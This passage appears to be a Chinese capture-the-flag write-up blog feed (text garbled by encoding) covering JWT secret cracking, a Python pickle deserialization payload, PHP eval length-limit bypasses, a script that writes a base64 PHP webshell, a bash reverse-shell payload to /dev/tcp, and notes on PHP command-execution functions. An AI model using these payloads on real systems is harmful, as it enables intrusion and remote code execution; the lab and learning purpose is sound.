<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ysllz@kali:~/æ¡Œé¢/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªurlä¸‹é¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jwt.io&#x2F;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ä¹‹åå¾—åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå»ä¸ªäººä¸­å¿ƒçš„é‚®ç®±åœ°å€ä¸‹é¢ç»™äº†ä¸ªhintï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">é‚®ç®±åœ°å€ï¼šhint: \u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿™å¥è¯ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">è¿™ç½‘ç«™ä¸ä»…å¯ä»¥ä»¥è–…ç¾Šæ¯›ï¼Œæˆ‘è¿˜ç•™äº†ä¸ªåé—¨ï¼Œå°±è—åœ¨lv6é‡Œ</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ½œä¼æ•Œåå·²ä¹…,åªèƒ½å¸®åˆ°è¿™äº† --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>åˆ åº“è·‘è·¯å‰æˆ‘ç•™äº†å¥½ä¸œè¥¿åœ¨è¿™é‡Œ<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¯¹æŠ—*ç«™é»‘ç§‘æŠ€ï¼Œç›®å‰ä¸ºæµ‹è¯•é˜¶æ®µï¼Œåªå¯¹ç®¡ç†å‘˜å¼€æ”¾ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠæºç dumpä¸‹æ¥ï¼Œåœ¨Admin.pyå½“ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è§¦å‘ç‚¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰¾äº†ä¸€ç¯‡å†™pickleçš„åšå®¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &#123;&#x27;foo&#x27;: [1,2,3],</span></span><br><span class="line"><span class="comment">#                 &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),</span></span><br><span class="line"><span class="comment">#                 &#x27;baz&#x27;: True&#125;</span></span><br><span class="line"><span class="comment"># jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="comment"># pickle.dump(data, jar) # å°†pickleåçš„æ•°æ®å†™å…¥jaræ–‡ä»¶</span></span><br><span class="line"><span class="comment"># jar.close()</span></span><br><span class="line"></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = pickle.load(pkl_file)</span><br><span class="line">print(data)</span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚è¿‡ç¨‹å°±è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„éœ€è¦çš„æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå½“æˆ‘ä»¬çš„æ–‡ä»¶ç»è¿‡æºç ä¸­çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>

<p>loadsè¿‡ç¨‹ï¼Œæˆ–è€…è¯´æ˜¯urlib.unquoteçš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘çš„é­”æœ¯æ–¹æ³•æ‰å¯ä»¥</p>
<p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__reduce__(self)</span><br><span class="line">å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ __reduce__ è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ __setstate__ çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›</span><br><span class="line"></span><br><span class="line">__reduce_ex__(self)</span><br><span class="line">__reduce_ex__ çš„å­˜åœ¨æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚å¦‚æœå®ƒè¢«å®šä¹‰ï¼Œåœ¨pickleæ—¶ __reduce_ex__ ä¼šä»£æ›¿ __reduce__ è¢«è°ƒç”¨ã€‚ __reduce__ ä¹Ÿå¯ä»¥è¢«å®šä¹‰ï¼Œç”¨äºä¸æ”¯æŒ __reduce_ex__ çš„æ—§ç‰ˆpickleçš„APIè°ƒç”¨ã€‚</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œåªèƒ½ä½¿ç”¨reduceè¿™ä¸€é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºä»…ä»…æœ‰è¯¥é­”æœ¯æ–¹æ³•ä¼šå‘Šè¯‰Pythonä½ çš„æ–‡ä»¶è¢«pickleè°ƒç”¨çš„æ—¶å€™è¯¥å¦‚ä½•ä½¿ç”¨å®ƒâ€¦</p>
<p>æ•…æˆ‘ä»¬ç”¨è¯¥é­”æœ¯æ–¹æ³•ç”Ÿæˆpayload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span><span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>nepctfå¤ç°</title>
    <url>/2021/03/24/nepctf%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Little-trick"><a href="#Little-trick" class="headerlink" title="Little_trick"></a>Little_trick</h1><p>è¿™é“é¢˜ç›®é™åˆ¶çš„å¾ˆæ­»ï¼Œä½†æ˜¯è¿™ç§é¢˜ç›®ä¹‹å‰å°±åšè¿‡äº†ï¼Œå¯ä»¥é€šè¿‡å†™å…¥æ–‡ä»¶çš„æ–¹å¼æ¥è¯»å–flagçš„ ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $nep = $_GET[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    $len = $_GET[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($len)&lt;<span class="number">8</span> &amp;&amp; strlen($nep)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($nep,<span class="number">0</span>,$len));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20210324191420028.png" alt="image-20210324191420028"></p>
<p>æ•…é€šè¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;&gt;cat&#39;;&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#39;*&gt;z&#39;;&amp;len&#x3D;7</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æœ‰ç¬¬äºŒä¸ªè§£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7 </span><br><span class="line">&#x2F;&#x2F; å¾—åˆ°ç›®å½•ä¸‹æ–‡ä»¶å</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7</span><br><span class="line">&#x2F;&#x2F; ç”Ÿæˆæ–‡ä»¶åä¸ºcatçš„æ–‡ä»¶</span><br><span class="line">?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7</span><br><span class="line">è¾“å…¥é€šé…ç¬¦*ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°ã€‚</span><br><span class="line">æœ€åè®¿é—®æ–‡ä»¶zå³å¯ã€‚</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå…¶å®len=7èƒ½åšå‡ºæ¥åº”è¯¥å¹¶éæ˜¯å‡ºé¢˜äººçš„æœ¬æ„¿ï¼Œå®é™…ä¸Šå‡ºé¢˜äººåº”è¯¥æ˜¯æƒ³è®©äººä»¤len=-1</p>
<p>åœ¨phpä¸­çš„æµ‹è¯•ï¼š</p>
<p><img src="image-20210324193126060.png" alt="image-20210324193126060"></p>
<p>è§£æ³•ä¸‰æ²¡è§è¿‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">p = <span class="string">r&#x27;&#x27;&#x27;&gt;hp</span></span><br><span class="line"><span class="string">&gt;1.p\\</span></span><br><span class="line"><span class="string">&gt;d\&gt;\\</span></span><br><span class="line"><span class="string">&gt;\ -\\</span></span><br><span class="line"><span class="string">&gt;e64\\</span></span><br><span class="line"><span class="string">&gt;bas\\</span></span><br><span class="line"><span class="string">&gt;7\|\\</span></span><br><span class="line"><span class="string">&gt;XSk\\</span></span><br><span class="line"><span class="string">&gt;Fsx\\</span></span><br><span class="line"><span class="string">&gt;dFV\\</span></span><br><span class="line"><span class="string">&gt;kX0\\</span></span><br><span class="line"><span class="string">&gt;bCg\\</span></span><br><span class="line"><span class="string">&gt;XZh\\</span></span><br><span class="line"><span class="string">&gt;AgZ\\</span></span><br><span class="line"><span class="string">&gt;waH\\</span></span><br><span class="line"><span class="string">&gt;PD9\\</span></span><br><span class="line"><span class="string">&gt;o\ \\</span></span><br><span class="line"><span class="string">&gt;ech\\</span></span><br><span class="line"><span class="string">ls -t&gt;0</span></span><br><span class="line"><span class="string">sh 0&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=&#123;&#125;&amp;len=-1&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    payload = <span class="string">&#x27;`&#x27;</span> + i.strip() + <span class="string">&#x27;`;;&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(payload))</span><br><span class="line">    requests.get(url.<span class="built_in">format</span>(payload))</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ³¨å…¥çš„æ–¹å¼æŠŠæ–‡ä»¶å†™è¿›å»</p>
<p>è§£æ³•4æ›´åŠ æ˜“æ‡‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;10110 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h1 id="easy-tomcat"><a href="#easy-tomcat" class="headerlink" title="easy_tomcat"></a>easy_tomcat</h1><p>è·ŸVNCTFå“ªä¸ªä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œå’‹éƒ½å¼¹ä¸å‡ºæ¥ï¼Œå…ˆpass</p>
<h1 id="bbxhh-revenge"><a href="#bbxhh-revenge" class="headerlink" title="bbxhh_revenge"></a>bbxhh_revenge</h1><p>è¿™é¢˜å‰é¢æ„Ÿè§‰å°±æ˜¯ğŸ¤¢</p>
<p>æœ€åä¸€æ­¥è¿™é‡Œæ„Ÿè§‰è¿˜æ˜¯ç›¸å½“æœ‰è¶£çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>, <span class="string">&quot;NepnEpneP&quot;</span>, $s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">	$_ = waf($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">	$__ = waf($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">	$a = <span class="keyword">new</span> $_($__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">	$c = waf($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">	$d = waf($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$c = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">	$d = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;echo \\<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‡ºé¢˜äººè¯´æ˜¯è€ƒå¯Ÿäº†åŸç”Ÿåå°„çš„æœºåˆ¶ï¼ˆæ„Ÿè§‰è¿™æ®µæ—¶é—´å…¨éƒ½æ˜¯PHPåŸç”Ÿç±»ï¼Ÿï¼‰ï¼Œå¯ä»¥å»æœä¸€ä¸‹ReflectionFunctionç±»ï¼Œåˆ©ç”¨invokArgsæ“ä½œï¼Œå®é™…ä¸Šå°±ç›¸å½“äºä½¿ç”¨äº†call_usr_func</p>
<p>å‡ºé¢˜äººçš„payloadï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">index.php?a=ReflectionFunction&amp;b=call_user_func&amp;c=invokeArgs&amp;d=array(%27assert%27,%27s%27.%27how_source(\%27/f\%27.\%27lag\%27)%27)</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰è‡ªå·±æ€»æ˜¯ä¸å¤ªæ˜ç™½call_user_funcèƒ½åšä»€ä¹ˆï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼š</p>
<p>é¦–å…ˆä¹¦å†™ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> call_user_func($a,$b);</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æµ‹è¯•ï¼Œcall_user_func å¸¸ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<h2 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents"></a>1.file_get_contents</h2><p>è¿™ä¸ªå€’æ˜¯å¾ˆå¥½ç†è§£ï¼š</p>
<p><img src="image-20210324205352364.png" alt="image-20210324205352364"></p>
<p>ä½†æ˜¯åŒæ—¶è¦æ³¨æ„çš„æœ‰å¦‚ä¸‹ç»†èŠ‚ï¼š</p>
<h3 id="1-è¯¥å‡½æ•°å…è®¸ä½¿ç”¨ä¼ªåè®®"><a href="#1-è¯¥å‡½æ•°å…è®¸ä½¿ç”¨ä¼ªåè®®" class="headerlink" title="1.è¯¥å‡½æ•°å…è®¸ä½¿ç”¨ä¼ªåè®®"></a>1.è¯¥å‡½æ•°å…è®¸ä½¿ç”¨ä¼ªåè®®</h3><p><img src="image-20210324205501930.png" alt="image-20210324205501930"></p>
<h3 id="2-è¯¥å‡½æ•°å…è®¸file-åè®®ç­‰ç­‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¿™æ ·æ“ä½œï¼š"><a href="#2-è¯¥å‡½æ•°å…è®¸file-åè®®ç­‰ç­‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¿™æ ·æ“ä½œï¼š" class="headerlink" title="2.è¯¥å‡½æ•°å…è®¸file://åè®®ç­‰ç­‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¿™æ ·æ“ä½œï¼š"></a>2.è¯¥å‡½æ•°å…è®¸file://åè®®ç­‰ç­‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¿™æ ·æ“ä½œï¼š</h3><p><img src="image-20210324205545033.png" alt="image-20210324205545033"></p>
<p>è‚¯å®šä¹Ÿæ”¯æŒhttpåè®®çš„å•¦</p>
<p><img src="image-20210324205632136.png" alt="image-20210324205632136"></p>
<p>ä½†æ˜¯è¦æ³¨æ„ï¼Œfile_get_contentsè¯¥å‡½æ•°å¹¶ä¸ä¼šè‡ªå¸¦å›æ˜¾ï¼Œæ‰€ä»¥è¯¥å‡½æ•°åªèƒ½ç”¨äºä½¿ç”¨æœ‰è¾“å‡ºçš„æƒ…å†µ</p>
<h2 id="2-assert-7-0ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨"><a href="#2-assert-7-0ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨" class="headerlink" title="2.assert 7.0ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨"></a>2.assert 7.0ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨</h2><p>å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œæ„Ÿè§‰æ²¡å•¥å¥½è¯´çš„</p>
<h2 id="3-system"><a href="#3-system" class="headerlink" title="3.system"></a>3.system</h2><p>å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä½†æ˜¯æ„Ÿè§‰å¤§éƒ¨åˆ†æƒ…å†µä¹Ÿä¼šè¢«banæ‰ï¼Œä½†æ˜¯awdè¯´ä¸å®šç”¨å¾—ä¸Šå‘¢</p>
<h2 id="4-exec"><a href="#4-exec" class="headerlink" title="4.exec"></a>4.exec</h2><p>å’Œsystemæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯éœ€è¦æ‰‹åŠ¨çš„è¾“å‡ºå‡ºæ¥</p>
<p><img src="image-20210325135738567.png" alt="image-20210325135738567"></p>
<p><img src="image-20210325135754393.png" alt="image-20210325135754393"></p>
<h2 id="5-shell-exec"><a href="#5-shell-exec" class="headerlink" title="5.shell_exec"></a>5.shell_exec</h2><p>å’ŒexecåŒç†ï¼Œä½†æ˜¯ä¸¤è€…ä¹‹é—´åˆæœ‰åŒºåˆ«ã€‚é¦–å…ˆä¸¤è€…éƒ½éœ€è¦echo çš„è¾“å‡ºï¼Œä½†æ˜¯shell_execçš„èµ·ç‚¹å°±æ˜¯å½“å‰ç›®å½•ï¼Œè€Œexecçš„èµ·ç‚¹ä¸ºä¹‹å‰çš„ç›®å½•ï¼Œæ•…ä¸¤è€…é—´è¿˜æ˜¯æœ‰åŒºåˆ«çš„</p>
<h2 id="6-passthru"><a href="#6-passthru" class="headerlink" title="6.passthru"></a>6.passthru</h2><p>å¯ä»¥ç”¨äºè¯»å–å›¾ç‰‡ï¼Ÿ</p>
<p>ä¸éœ€è¦echoè‡ªå·±å°±æœ‰å›æ˜¾äº†</p>
<p><img src="image-20210325140051160.png" alt="image-20210325140051160"></p>
<h2 id="7-pcntl-exec"><a href="#7-pcntl-exec" class="headerlink" title="7.pcntl_exec"></a>7.pcntl_exec</h2><p>ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œè¿™ä¸ªéœ€è¦æ‰§è¡Œå‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(â€œ/bin/bashâ€, <span class="keyword">array</span>(â€œ/tmp/b4dboy.shâ€));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">ls -l /</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¯¥å‡½æ•°åœ¨7.0å·²ç»é»˜è®¤è¢«banæ‰äº†æ‰€ä»¥å¹¶ä¸å¥½ç”¨</p>
<p>å…¶ä»–å‡½æ•°å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ob_start()ã€unserialize()ã€creat_function()</span><br><span class="line">usort()ã€uasort()ã€uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>Java</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejså­¦ä¹ ç¬”è®°</title>
    <url>/2021/03/01/nodejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
